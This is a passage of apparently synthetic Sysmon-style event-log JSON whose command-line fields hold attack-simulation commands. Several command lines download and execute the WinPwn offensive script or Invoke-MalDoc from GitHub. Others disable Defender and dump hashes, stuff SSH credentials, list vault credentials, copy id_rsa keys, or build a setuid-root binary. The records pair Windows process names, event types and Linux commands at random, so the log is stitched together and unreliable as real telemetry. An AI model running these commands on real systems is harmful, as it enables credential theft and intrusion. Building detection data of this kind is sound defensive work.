        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\town..exe",
        "UtcTime": "2024-05-17T01:36:51.765334Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-34.wilcox-lee.net",
        "User": "angela87",
        "ProcessID": 1495,
        "ProcessName": "nc.exe",
        "CommandLine": "\"NOW=$(date +%m%d%H%M%Y)\\ndate 010100001971\\ntouch #{target_filename}\\ndate \\\"$NOW\\\"\\nstat #{target_filename}\\n\",",
        "LogonID": 403688,
        "LogonGuid": "8df6b073-6645-4d98-b064-fc11c51e51f4",
        "SourceProcessID": 8846,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\thus..exe",
        "DestinationProcessID": 8323,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\south..dll",
        "UtcTime": "2024-05-17T01:36:51.765334Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-30.jensen-santiago.com",
        "User": "jgraham",
        "ProcessID": 5011,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nshareenumeration -noninteractive -consoleoutput\",",
        "LogonID": 353153,
        "LogonGuid": "696648f2-168c-4841-83cb-0301d738d5b7",
        "SourceProcessID": 7055,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\among..dll",
        "DestinationProcessID": 4810,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\physical..exe",
        "UtcTime": "2024-05-17T01:36:51.765334Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-18.rios.com",
        "User": "riggscarmen",
        "ProcessID": 7219,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nbrowserpwn -consoleoutput -noninteractive\",",
        "LogonID": 827128,
        "LogonGuid": "a3fbeb8f-184f-42a4-abeb-99fbb48cb93a",
        "SourceProcessID": 1609,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\investment..dll",
        "DestinationProcessID": 6684,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\now..exe",
        "UtcTime": "2024-05-17T01:36:51.766334Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-83.navarro.com",
        "User": "jbuchanan",
        "ProcessID": 6931,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\" /v HideClock /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 377136,
        "LogonGuid": "6d38230b-6003-4ba7-82f0-23f8c6fb71e4",
        "SourceProcessID": 5838,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\yes..dll",
        "DestinationProcessID": 7365,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\size..dll",
        "UtcTime": "2024-05-17T01:36:51.766334Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-34.baker.org",
        "User": "ivan24",
        "ProcessID": 1127,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nspoolvulnscan -noninteractive -consoleoutput\",",
        "LogonID": 378156,
        "LogonGuid": "449cf18e-293e-42ae-acb3-db45b7b6a66d",
        "SourceProcessID": 5274,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\loss..dll",
        "DestinationProcessID": 3362,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\such..dll",
        "UtcTime": "2024-05-17T01:36:51.766334Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-85.santiago.com",
        "User": "mitchell68",
        "ProcessID": 8260,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"chown -R #{owner}:#{group} #{file_or_folder}\\n\",",
        "LogonID": 793591,
        "LogonGuid": "d948a5df-e651-4a4e-abd5-be96fbeb6b81",
        "SourceProcessID": 8617,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\day..dll",
        "DestinationProcessID": 3749,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\bad..dll",
        "UtcTime": "2024-05-17T01:36:51.766334Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-00.garcia-garrett.net",
        "User": "qreynolds",
        "ProcessID": 9686,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Add-Type -TypeDefinition @'\\npublic class Test {\\n    public static void Main(string[] args) {\\n        System.Console.WriteLine(\\\"tweet, tweet\\\");\\n    }\\n}\\n'@ -OutputAssembly \\\"#{executable_filepath}\\\"\\n\\nStart-Process -FilePath \\\"#{executable_filepath}\\\"\\n\",",
        "LogonID": 981740,
        "LogonGuid": "f8dad97a-b84d-4ec9-b9ca-0745c2d22bda",
        "SourceProcessID": 3894,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\political..dll",
        "DestinationProcessID": 2985,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\news..dll",
        "UtcTime": "2024-05-17T01:36:51.766334Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-63.campbell-sanchez.com",
        "User": "kenneth99",
        "ProcessID": 4421,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Write-Host \\\"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\\\" -fore green\\nImport-Module \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\PowerDump.ps1\\\"\\nInvoke-PowerDump\",",
        "LogonID": 721340,
        "LogonGuid": "f52a3010-045a-43f3-9804-2f30dcedd2a8",
        "SourceProcessID": 2695,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\major..dll",
        "DestinationProcessID": 1780,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\civil..dll",
        "UtcTime": "2024-05-17T01:36:51.766334Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-08.sullivan.com",
        "User": "theodore50",
        "ProcessID": 8564,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"setspn -T #{domain_name} -Q */*\\n\",",
        "LogonID": 344644,
        "LogonGuid": "c93d8940-6fb7-4ce0-9f1d-0e4128b1ede7",
        "SourceProcessID": 3521,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\show..dll",
        "DestinationProcessID": 4194,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\loss..exe",
        "UtcTime": "2024-05-17T01:36:51.767336Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-91.mccarthy.org",
        "User": "nicoleallen",
        "ProcessID": 7100,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop\",",
        "LogonID": 880586,
        "LogonGuid": "ec3ab30a-b018-41e3-88a2-b744e1620e16",
        "SourceProcessID": 4161,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\purpose..dll",
        "DestinationProcessID": 1003,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\send..dll",
        "UtcTime": "2024-05-17T01:36:51.767336Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-99.duran-williams.net",
        "User": "cjohnson",
        "ProcessID": 1368,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$PathToAtomicsFolder\\\\T1055\\\\bin\\\\x64\\\\UuidFromStringA.exe -debug\\n\",",
        "LogonID": 444933,
        "LogonGuid": "c3954c65-fcd1-4cfa-b255-9cc6bc5dffbd",
        "SourceProcessID": 1697,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\case..exe",
        "DestinationProcessID": 2679,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\pressure..dll",
        "UtcTime": "2024-05-17T01:36:51.767336Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-27.raymond-reid.com",
        "User": "anthony64",
        "ProcessID": 2446,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Start-Process #{UltraVNC_Viewer_Path}\\n\",",
        "LogonID": 731725,
        "LogonGuid": "2cafdd44-a835-4b72-858c-e8da27a6589b",
        "SourceProcessID": 7683,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\money..exe",
        "DestinationProcessID": 7853,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\identify..dll",
        "UtcTime": "2024-05-17T01:36:51.767336Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-00.davis-morgan.com",
        "User": "amber14",
        "ProcessID": 2835,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"C:\\\\Windows\\\\SysWow64\\\\Register-CimProvider.exe -Path \\\"#{dll_payload}\\\"\\n\",",
        "LogonID": 392319,
        "LogonGuid": "8a31de56-4dc1-45f6-b3e7-914f2c63baa2",
        "SourceProcessID": 6256,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\usually..dll",
        "DestinationProcessID": 2112,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\goal..exe",
        "UtcTime": "2024-05-17T01:36:51.767336Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-19.kelly.com",
        "User": "stephenmalone",
        "ProcessID": 9347,
        "ProcessName": "malware.exe",
        "CommandLine": "\"cp \\\"$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt\\\" /tmp/\\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\\\":\\\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\\\":\\\" -f1`@#{target_host};done\\n\",",
        "LogonID": 686984,
        "LogonGuid": "4f89840c-7be1-468d-99bb-f615427a0780",
        "SourceProcessID": 1531,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Windows\\city..dll",
        "DestinationProcessID": 7018,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\without..exe",
        "UtcTime": "2024-05-17T01:36:51.768336Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-38.moore.net",
        "User": "leonkristin",
        "ProcessID": 3655,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"cmd /c \\\"#{ps_exec_location}\\\" -accepteula -i -s cmd.exe /c logman update trace \\\"#{session}\\\" --p \\\"#{provider}\\\" -ets\",",
        "LogonID": 502461,
        "LogonGuid": "24c13124-5b49-4d1b-9836-1da591b72eba",
        "SourceProcessID": 8695,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\save..dll",
        "DestinationProcessID": 1426,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\economic..exe",
        "UtcTime": "2024-05-17T01:36:51.768336Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-96.williams.org",
        "User": "stevenpeterson",
        "ProcessID": 2701,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"C:\\\\Windows\\\\SysWow64\\\\Register-CimProvider.exe -Path \\\"#{dll_payload}\\\"\\n\",",
        "LogonID": 423987,
        "LogonGuid": "02d0c16f-c873-4ed6-b23e-82ec96e44d6e",
        "SourceProcessID": 4531,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\bad..exe",
        "DestinationProcessID": 8656,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\most..dll",
        "UtcTime": "2024-05-17T01:36:51.768336Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-98.kemp.biz",
        "User": "reeddonna",
        "ProcessID": 6030,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"vaultcmd /listcreds:\\\"Windows Credentials\\\" /all\\n\",",
        "LogonID": 404496,
        "LogonGuid": "978a651b-b61a-4e42-91b1-3fb1bb7e777d",
        "SourceProcessID": 1165,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\national..dll",
        "DestinationProcessID": 2250,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\stop..dll",
        "UtcTime": "2024-05-17T01:36:51.768336Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-47.garcia-fitzgerald.com",
        "User": "bergerkenneth",
        "ProcessID": 2012,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"sudo cp #{script_location} #{script_destination}\\nsudo touch /private/var/db/emondClients/#{empty_file}\\n\",",
        "LogonID": 983126,
        "LogonGuid": "6825a69a-be1c-4998-a8d2-a97dfcb2c8f5",
        "SourceProcessID": 9210,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\create..exe",
        "DestinationProcessID": 3500,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\little..dll",
        "UtcTime": "2024-05-17T01:36:51.769334Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-81.castro.com",
        "User": "adamthompson",
        "ProcessID": 7447,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\\\"$_\\\").gPlink){Write-Host \\\"[+] Domain Path:\\\"([ADSI]\\\"$_\\\").Path;$a=((([ADSI]\\\"$_\\\").gplink) -replace \\\"[[;]\\\" -split \\\"]\\\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \\\"Policy Path[$i]:\\\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \\\"Policy Name[$i]:\\\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \\\"`n\\\" }}\\n\",",
        "LogonID": 697798,
        "LogonGuid": "3730e01d-8397-482d-9ab3-d287f832e2cc",
        "SourceProcessID": 1655,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\design..dll",
        "DestinationProcessID": 2702,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\year..exe",
        "UtcTime": "2024-05-17T01:36:51.769334Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-68.lewis-mooney.com",
        "User": "hamiltonsara",
        "ProcessID": 4858,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\\\" -UseBasicParsing) \\nInvoke-Maldoc -macroFile \\\"PathToAtomicsFolder\\\\T1059.005\\\\src\\\\T1059_005-macrocode.txt\\\" -officeProduct \\\"Word\\\" -sub \\\"Extract\\\"\\n\",",
        "LogonID": 939322,
        "LogonGuid": "8ad5f2e0-8818-4c2d-b8c5-3acdd7ea00a1",
        "SourceProcessID": 4015,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\single..exe",
        "DestinationProcessID": 6687,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\size..exe",
        "UtcTime": "2024-05-17T01:36:51.769334Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-65.stanton.net",
        "User": "michaellewis",
        "ProcessID": 9385,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"mkdir #{output_folder}\\nfind #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \\\\;\\nexit 0\\n\",",
        "LogonID": 955334,
        "LogonGuid": "1bf54aa5-bde5-4e8a-87aa-b750f14b7b19",
        "SourceProcessID": 4878,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\life..dll",
        "DestinationProcessID": 3670,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\west..dll",
        "UtcTime": "2024-05-17T01:36:51.769334Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-58.greene-lewis.net",
        "User": "sharon80",
        "ProcessID": 7259,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"cp #{payload} /tmp/hello.c\\nsudo chown root /tmp/hello.c\\nsudo make /tmp/hello\\nsudo chown root /tmp/hello\\nsudo chmod u+s /tmp/hello\\n/tmp/hello\\n\",",
        "LogonID": 312574,
        "LogonGuid": "133b4497-accc-4c2d-9b53-b777b287fdb1",
        "SourceProcessID": 5831,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\interest..dll",
        "DestinationProcessID": 6155,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\where..dll",
        "UtcTime": "2024-05-17T01:36:51.769334Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-97.carney.com",
        "User": "daniellefarley",
        "ProcessID": 3029,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nwinPEAS -noninteractive -consoleoutput\",",
        "LogonID": 295207,
        "LogonGuid": "55e85a15-67b4-48d1-b5a4-c26086b6d819",
        "SourceProcessID": 8020,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\science..exe",
        "DestinationProcessID": 6732,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\and..dll",
        "UtcTime": "2024-05-17T01:36:51.770335Z"
    },
